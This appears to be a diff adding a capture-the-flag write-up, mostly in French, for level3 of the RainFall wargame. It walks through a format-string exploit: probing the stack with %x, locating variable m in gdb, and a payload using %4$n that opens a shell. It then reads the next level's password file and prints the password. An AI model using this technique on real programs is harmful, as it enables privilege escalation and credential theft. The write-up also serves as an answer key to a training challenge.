@@ -1,3 +1,47 @@
 https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Les%20failles%20Format%20String.pdf
 
 (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
+
+Nous avons un binaire avec un printf qui imprime directement ce que le programme reçoit dans un fgets précédent.
+
+Avec un input : "%s" => Segmentation_fault
+Avec un input : "%x" => on affiche le premier emplacement mémoire de la pile
+On place au début de notre input 4 'A' => "AAAA"
+Ensuite on va essayer de voir si en imprimant les adresses de la pile, on retrouve celle qui correspondrait à AAAA : 4 \x41 qui se suivraient dans la mémoire
+python -c 'print "AAAA" + " %x " * 10' | ./level3
+=> AAAA 200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520  20782520  20782520  20782520  20782520
+Il semblerait que notre 4ème formateur pointe sur nos "AAAA"
+
+le formateur '%n' permet d'écrire à une adresse mémoire pointée le nombre de caractère imprimé par printf jusqu'au formateur.
+
+En regardant la suite du code, on peut voir un system("/bin/sh") qui se situe après une comparaison entre 64 et la variable 'm'
+
+un input '"A" * 64 + "%$4n"' écrirait 64 à la 4ème adresse de la pile.
+Ici ce serait donc '0x41414141'.
+On va chercher à récupérer l'adresse de m pour lui attribuer la valeur 64.
+
+gdb -q level3
+info variables
+=> 0x0804988c  m
+
+on est en little endian donc adresse à eécrire sous la forme :
+\x8c\x98\x04\x08
+
+ce qui nous donne comme payload :
+
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' | ./level3
+=> �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+
+it seems that we went to the good place but stdin closed itself
+
+a little cat should do it : 
+(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
+
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'; cat) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+whoami
+level4
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
